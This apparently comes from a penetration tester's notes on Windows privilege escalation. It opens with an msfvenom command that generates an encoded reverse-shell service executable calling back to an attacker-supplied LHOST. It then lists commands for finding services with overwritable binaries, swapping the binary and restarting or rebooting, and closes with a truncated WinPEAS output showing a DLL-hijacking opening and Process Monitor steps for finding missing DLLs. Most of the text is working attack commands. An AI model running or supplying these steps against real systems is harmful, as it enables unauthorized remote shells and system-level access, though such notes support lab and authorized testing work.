
MSFVenom payload:
```
msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -f exe-service -o winshell.exe LHOST=IP LPORT=PORT
```

Finding a service:
```
// Important: only works in "interactive situations". If it throws an error, it's not interactive. Then, use Winpeas.exe --> "Services Information", always works.
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
// OR
. .\PowerUp.ps1
Get-ModifiableServiceFile                  // might not always work
```

If there is a vulnerable service (overwritable binary), replace the binary.
To start/reboot the service:

```
sc.exe stop ServiceName
sc.exe start ServiceName
```
If this gets denied, check if reboot privileges are enabled:
```
whoami /priv
shutdown /r /t 0
```



#### DLL Hijacking
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking
```
 
   =================================================================================================                   
   
    GammaService(GammaService)[C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe] - System - isDotNet - No quotes and Space detected                                                                                              
    File Permissions: Users [WriteData/CreateFiles]                                                                                                                                                                                            
    Possible DLL Hijacking in binary folder: C:\Program Files\Enterprise Apps\Current Version (Users [WriteData/CreateFiles])                                                                                                                  
   =================================================================================================    
 // PART REMOVED
 // PART REMOVED
 // PART REMOVED 
 Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software                                                                                                          
    C:\Program Files\7-Zip                                                                                                                                                                                                                     
    C:\Program Files\Common Files                                                                                                                                                                                                              
    C:\Program Files\desktop.ini                                                                                       
    C:\Program Files\Enterprise Apps(Users [WriteData/CreateFiles])                                                                                                                                                                            
    C:\Program Files\Internet Explorer                                                                                                                                                                                                         
    C:\Program Files\KeePass Password Safe 2                                     
```
The `C:\Program Files\Enterprise Apps` is writable by the user, and hosts DLLs.

To check which DLLs are called, copy the executable to the Windows VM and run Process monitor with these filters:
```
result contains "Not found"

```